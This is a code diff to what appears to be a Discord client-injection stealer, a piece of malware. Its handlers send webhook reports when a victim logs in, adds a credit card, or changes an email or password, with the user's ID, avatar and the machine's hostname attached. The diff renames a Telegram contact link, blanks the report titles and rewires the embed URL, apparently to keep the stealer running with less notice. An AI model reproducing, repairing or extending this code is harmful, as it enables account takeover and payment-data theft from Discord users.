@@ -28,7 +28,7 @@ var config = {
             text: ``,
             icon_url: "https://cdn.discordapp.com/attachments/1146489781262495886/1150919285405925406/fiji.png",
         },
-        href: "https://t.me/fiji",
+        href: "https://t.me/fijist",
         avatar_url: "https://cdn.discordapp.com/attachments/1146489781262495886/1150919285405925406/fiji.png"
     },
 
@@ -260,11 +260,11 @@ var event_handlers = {
             username: config.embed.username,
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
-                title: "Discord | Credit card added",
-                url: config.embed.href,
+                title: "",
+                url: config.embed,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
+                    url: config.embed,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 thumbnail: {
@@ -320,7 +320,7 @@ var event_handlers = {
                 },
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
+                    url: config.embed,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
             })]
@@ -338,11 +338,11 @@ var event_handlers = {
             username: config.embed.username,
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
-                title: "Discord | User logged in",
-                url: config.embed.href,
+                title: "",
+                url: config.embed,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
+                    url: config.embed,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 thumbnail: {
@@ -393,7 +393,7 @@ var event_handlers = {
                 },
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
+                    url: config.embed,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
             })]
@@ -411,11 +411,11 @@ var event_handlers = {
             username: config.embed.username,
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
-                title: "Discord | Email changed",
-                url: config.embed.href,
+                title: "",
+                url: config.embed,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
+                    url: config.embed,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 thumbnail: {
@@ -466,7 +466,7 @@ var event_handlers = {
                 },
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
+                    url: config.embed,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
             })]
@@ -484,11 +484,11 @@ var event_handlers = {
             username: config.embed.username,
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
-                title: "Discord | Password changed",
-                url: config.embed.href,
+                title: "",
+                url: config.embed,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
+                    url: config.embed,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 thumbnail: {
@@ -539,7 +539,7 @@ var event_handlers = {
                 },
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
+                    url: config.embed,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
             })]
@@ -713,9 +713,9 @@ async function initialize() {
                 sendToWebhook({
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
-                    url: config.embed.href,
+                    url: config.embed,
                     embeds: [createEmbed({
-                        title: "Discord | Client initialized (not logged in)",
+                        title: "",
                         fields: [{
                             name: "Hostname",
                             value: `\`\`\`${os.hostname}\`\`\``,
@@ -740,11 +740,11 @@ async function initialize() {
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
                     embeds: [createEmbed({
-                        title: "Discord | Client initialized",
-                        url: config.embed.href,
+                        title: "",
+                        url: config.embed,
                         author: {
                             name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                            url: config.embed.href,
+                            url: config.embed,
                             icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         thumbnail: {
@@ -799,7 +799,7 @@ async function initialize() {
                         },
                         author: {
                             name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                            url: config.embed.href,
+                            url: config.embed,
                             icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                     })]
@@ -816,11 +816,11 @@ async function initialize() {
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
                     embeds: [createEmbed({
-                        title: "Discord | User logged out",
-                        url: config.embed.href,
+                        title: "",
+                        url: config.embed,
                         author: {
                             name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                            url: config.embed.href,
+                            url: config.embed,
                             icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         thumbnail: {
